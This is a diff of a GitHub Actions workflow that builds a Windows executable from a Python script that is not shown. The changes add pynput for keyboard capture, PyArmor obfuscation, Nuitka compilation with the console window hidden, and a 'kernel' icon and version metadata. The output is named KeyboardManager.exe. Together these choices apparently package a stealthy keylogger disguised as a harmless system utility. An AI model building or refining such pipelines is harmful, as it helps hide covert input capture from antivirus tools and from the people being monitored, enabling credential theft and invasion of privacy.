@@ -1,20 +1,37 @@
 name: Build Windows EXE
 on: [push]
+
 jobs:
   build:
     runs-on: windows-latest
     steps:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@v4  # Get your code
+
       - name: Set up Python
         uses: actions/setup-python@v5
         with:
           python-version: '3.11'
-      - name: Install PyInstaller and Pillow
-        run: pip install pyinstaller pillow
-      - name: Build EXE with icon
-        run: pyinstaller --onefile --icon=kernel-icon.png kernel32.py
-      - name: Upload EXE
+
+      - name: Install dependencies
+        run: |
+          pip install nuitka pyarmor pynput
+          # Add other dependencies if needed (e.g., pynput)
+
+      - name: Obfuscate code
+        run: |
+          pyarmor obfuscate --recursive --output ./build script.py
+
+      - name: Compile with Nuitka
+        run: |
+          nuitka --onefile --windows-disable-console --remove-output \
+            --windows-icon-from-ico=kernel-icon.ico \
+            --windows-version-info=version_info.txt \
+            --output-filename="KeyboardManager.exe" \
+            --include-data-dir=./build=./ \
+            ./build/script.py
+
+      - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: PY2EXE1234
-          path: dist/
+          name: KeyboardManager
+          path: KeyboardManager.exe
